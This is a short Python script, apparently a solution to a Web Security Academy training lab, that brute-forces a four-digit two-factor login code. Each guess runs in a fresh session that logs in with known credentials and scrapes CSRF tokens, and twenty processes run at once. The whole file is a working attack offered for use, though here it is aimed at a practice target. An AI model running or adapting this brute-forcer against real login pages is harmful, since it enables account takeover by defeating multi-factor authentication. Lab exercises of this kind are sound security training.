import requests
from bs4 import BeautifulSoup
from multiprocessing import Pool

URL = "https://0a52002203956fa885a550910063008e.web-security-academy.net/"

def get_csrf_token(session, url):
    r = session.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup.find(attrs={"name": "csrf"}).get("value")

def login(session):
    csrf_token_login_form = get_csrf_token(session, URL + "login")
    data = {"csrf": csrf_token_login_form, "username": "carlos", "password": "montoya"}
    session.post(URL + "login", data=data)

def enter_code(code):
    session = requests.Session()
    login(session)
    csrf_token_code_form = get_csrf_token(session, URL + "login2")
    data = {"csrf": csrf_token_code_form, "mfa-code": code}
    r = session.post(URL + "login2", data=data)
    if "Incorrect security code" not in r.text:
        print(f"Valid code found: {code}")

if __name__ == "__main__":
    with Pool(processes=20) as pool:
        codes = [f"{i:04}" for i in range(10_000)]
        pool.map(enter_code, codes)
